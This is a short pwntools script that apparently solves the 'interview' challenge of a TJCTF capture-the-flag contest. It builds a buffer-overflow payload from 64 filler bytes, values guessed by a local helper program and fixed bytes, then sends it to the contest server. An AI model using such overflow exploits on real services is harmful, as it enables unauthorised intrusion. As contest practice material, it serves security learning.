#!/usr/bin/env python

from pwn import *
from subprocess import *
import binascii
import struct

r = remote("problem1.tjctf.org", 8000)
#r = process("./interview", raw=False)
# gdb.attach(r, '''
# 	break *0x565557ba
# 	break *0x565557ea
# 	c
# 	''')
guess = check_output(["./inter2"]).split('\n')[:-1]
print guess
print r.recv()
payload = "A"*64 # overflow name
for i in guess:
	payload += struct.pack("I", int(i,16))
payload += '\x1b\x41\x52\x21'
payload += '\x1b\x41\x52\x21'


print payload
r.sendline(payload) 
print r.recvall()
